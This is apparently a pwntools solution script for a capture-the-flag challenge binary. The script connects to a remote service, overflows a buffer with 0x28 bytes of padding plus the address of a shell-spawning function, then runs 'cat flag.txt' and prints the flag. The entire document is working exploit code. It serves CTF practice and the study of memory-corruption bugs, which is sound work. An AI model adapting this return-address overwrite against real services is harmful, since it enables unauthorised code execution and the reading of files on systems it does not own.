from pwn import *
elf = context.binary = ELF("./chal", checksec=False)

# p = process('./chal')
p = remote("IP_ADDR", 5007)

binsh = p64(elf.symbols.FUN_00401174)
payload = b'A'*0x28 + binsh

p.sendlineafter(b'Hello, whats your name?', payload)
p.sendline(b'cat flag.txt')

flag = p.recvall(timeout=1).strip()
print(flag.decode())

p.close()